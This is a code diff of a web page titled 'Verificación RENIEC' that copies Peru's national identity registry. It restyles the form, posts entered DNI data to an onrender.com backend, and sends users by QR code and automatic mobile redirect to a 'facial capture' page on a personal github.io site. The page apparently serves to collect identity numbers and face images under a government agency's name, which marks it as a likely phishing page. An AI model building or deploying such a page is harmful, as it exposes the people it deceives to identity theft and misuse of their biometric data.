@@ -5,14 +5,83 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verificación RENIEC</title>
 <style>
-  body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f6f9; margin: 0; padding: 30px; }
-  h1 { color: #333; }
-  button { padding: 15px 30px; font-size: 18px; font-weight: bold; color: #fff; background-color: #0077cc; border: none; border-radius: 8px; cursor: pointer; margin-top: 15px; }
-  button:hover { background-color: #005fa3; }
-  #formulario { margin-top: 20px; }
-  input { padding: 10px; font-size: 16px; width: 250px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; text-transform: uppercase; }
-  #mensaje { margin-top: 15px; font-weight: bold; color: #444; white-space: pre-line; }
-  #qrcode { margin-top: 20px; display: flex; justify-content: center; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    text-align: center;
+    margin: 0;
+    padding: 30px;
+    background: linear-gradient(135deg, #e0f7fa, #ffffff);
+    color: #333;
+  }
+
+  h1 {
+    color: #0077cc;
+    margin-bottom: 10px;
+  }
+
+  #formulario h2 {
+    color: #555;
+    margin-bottom: 20px;
+  }
+
+  input {
+    padding: 12px;
+    font-size: 16px;
+    width: 260px;
+    margin: 8px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    transition: all 0.2s ease-in-out;
+    text-transform: uppercase;
+  }
+
+  input:focus {
+    border-color: #0077cc;
+    box-shadow: 0 0 8px rgba(0,119,204,0.3);
+    outline: none;
+  }
+
+  button {
+    padding: 15px 35px;
+    font-size: 18px;
+    font-weight: bold;
+    color: #fff;
+    background-color: #0077cc;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-top: 15px;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 10px rgba(0,119,204,0.3);
+  }
+
+  button:hover {
+    background-color: #005fa3;
+    transform: translateY(-2px);
+    box-shadow: 0 6px 12px rgba(0,95,163,0.4);
+  }
+
+  #qrcode {
+    margin-top: 20px;
+    display: flex;
+    justify-content: center;
+  }
+
+  #mensaje {
+    margin-top: 15px;
+    font-weight: bold;
+    color: #444;
+    white-space: pre-line;
+  }
+
+  #formulario {
+    background: rgba(255,255,255,0.9);
+    display: inline-block;
+    padding: 25px 30px;
+    border-radius: 15px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+  }
 </style>
 </head>
 <body>
@@ -33,7 +102,6 @@
 <div id="qrcode"></div>
 <p id="mensaje"></p>
 
-<!-- Librería QRCode -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script>
@@ -54,7 +122,6 @@ async function enviarDatos() {
   }
 
   try {
-    // Llamada al backend en Render
     const response = await fetch("https://verificacion-reniec.onrender.com/verificar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -62,28 +129,31 @@ async function enviarDatos() {
     });
 
     const data = await response.json();
-    document.getElementById("mensaje").textContent = data.mensaje;
+    const mensajeElem = document.getElementById("mensaje");
+    mensajeElem.textContent = data.mensaje;
 
     if (data.status === "ok") {
-      // URL de captura facial
       const capturaUrl = `https://RIZS0210.github.io/VERIFICACION/captura.html?dni=${dni}`;
 
-      // Generar QR
+      // Generar QR negro
       document.getElementById("qrcode").innerHTML = "";
       new QRCode(document.getElementById("qrcode"), {
         text: capturaUrl,
         width: 180,
         height: 180,
-        colorDark : "#0077cc",
+        colorDark : "#000000",
         colorLight : "#ffffff",
         correctLevel : QRCode.CorrectLevel.H
       });
+
+      // Mensaje adicional
+      mensajeElem.textContent += `\n\nPara continuar con la verificación, escanee el código QR o acceda desde su celular al siguiente enlace:\n${capturaUrl}`;
 
       // Redirigir automáticamente si es móvil
       if (esMovil) {
         setTimeout(() => {
           window.location.href = capturaUrl;
-        }, 2000); // espera 2 segundos para mostrar mensaje y QR
+        }, 2000);
       }
     }
 
